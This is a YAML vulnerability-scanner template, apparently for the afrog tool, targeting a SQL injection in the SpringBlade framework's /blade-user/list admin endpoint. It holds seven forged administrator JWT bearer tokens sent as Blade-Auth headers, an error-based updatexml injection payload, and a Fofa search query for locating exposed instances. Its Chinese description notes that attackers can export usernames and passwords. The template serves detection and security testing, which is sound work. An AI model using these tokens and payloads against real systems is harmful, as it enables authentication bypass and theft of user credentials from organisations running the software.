id: springblade-blade-user-list-sqli-2

info:
  name: SpringBlade 框架后台 blade-user-list 路径 SQL 注入漏洞
  author: zan8in
  severity: high
  verified: true
  descripion: |-
    SpringBlade 框架后台 blade-user-list 路径 SQL注入漏洞，攻击者可将用户名、密码等敏感信息通过excel导出。
    Fofa: body="saber/iconfont.css" || body="Saber 将不能正常工作"||title="Sword Admin"||body="We're sorry but avue-data doesn't work"
  tags: springblade,sqli
  created: 2023/12/12

set:
  rand1: randomInt(10000, 99999)
  token1: "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSJ9.-XHkGTDfmGOdB8DNKwcCgWIfcR8Ln4hs09CVDslv1ATodR2Mjmjrq6KCysoK-sw3zf2EwATzdgxGXNGxfmj9wg"
  token2: "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ"
  token3: "bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODIxNzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.5qFj53pqhIZVccg_h0WAvd-FAjG7sDwfVUe5gPBHa0g"
  token4: "bearer eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODIxNzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.gbUWSdFfmzfU_gKzFYjyyJzcrHBfOwswJvptowNwNwfo12QilWudTMg-LbDAOPwk"
  token5: "bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODIxNzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.kol9scDVwLDE8U3mM_j8O4UYrpdUc9_Zw935g7Nb979DfRuanai1UeKsK2zCKuR77Otryi0sGzBfGANDbLseBg"
  token6: "bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMSIsIm5hbWUiOiJhZG1pbiIsInJvbGVfbmFtZSI6ImFkbWluaXN0cmF0b3IifQ.3KqH3YSCVDA2wpD1JB4p5iOqFK_qa3pjuwIQOpSYB1e_CEQL4g-Ulkn_oJyOGBtBvJQn_qiMn59jFbMGnNHUwA"
  token7: "bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ"
rules:
  r1:
    request:
      method: GET
      path: /blade-user/list?updatexml(1,concat(0x7e,md5({{rand1}}),0x7e),1)=1
      headers:
        Blade-Auth: "{{token1}}"
    expression: response.status == 500 && response.body.bcontains(b'XPATH syntax error:') && response.body.bcontains(bytes(substr(md5(string(rand1)), 0, 31)))
  r2:
    request:
      method: GET
      path: /blade-user/list?updatexml(1,concat(0x7e,md5({{rand1}}),0x7e),1)=1
      headers:
        Blade-Auth: "{{token2}}"
    expression: response.status == 500 && response.body.bcontains(b'XPATH syntax error:') && response.body.bcontains(bytes(substr(md5(string(rand1)), 0, 31)))
  r3:
    request:
      method: GET
      path: /blade-user/list?updatexml(1,concat(0x7e,md5({{rand1}}),0x7e),1)=1
      headers:
        Blade-Auth: "{{token3}}"
    expression: response.status == 500 && response.body.bcontains(b'XPATH syntax error:') && response.body.bcontains(bytes(substr(md5(string(rand1)), 0, 31)))
  r4:
    request:
      method: GET
      path: /blade-user/list?updatexml(1,concat(0x7e,md5({{rand1}}),0x7e),1)=1
      headers:
        Blade-Auth: "{{token4}}"
    expression: response.status == 500 && response.body.bcontains(b'XPATH syntax error:') && response.body.bcontains(bytes(substr(md5(string(rand1)), 0, 31)))
  r5:
    request:
      method: GET
      path: /blade-user/list?updatexml(1,concat(0x7e,md5({{rand1}}),0x7e),1)=1
      headers:
        Blade-Auth: "{{token5}}"
    expression: response.status == 500 && response.body.bcontains(b'XPATH syntax error:') && response.body.bcontains(bytes(substr(md5(string(rand1)), 0, 31)))
  r6:
    request:
      method: GET
      path: /blade-user/list?updatexml(1,concat(0x7e,md5({{rand1}}),0x7e),1)=1
      headers:
        Blade-Auth: "{{token6}}"
    expression: response.status == 500 && response.body.bcontains(b'XPATH syntax error:') && response.body.bcontains(bytes(substr(md5(string(rand1)), 0, 31)))
  r7:
    request:
      method: GET
      path: /blade-user/list?updatexml(1,concat(0x7e,md5({{rand1}}),0x7e),1)=1
      headers:
        Blade-Auth: "{{token7}}"
    expression: response.status == 500 && response.body.bcontains(b'XPATH syntax error:') && response.body.bcontains(bytes(substr(md5(string(rand1)), 0, 31)))
expression: r1() || r2() || r3() || r4() || r5() || r6() || r7()
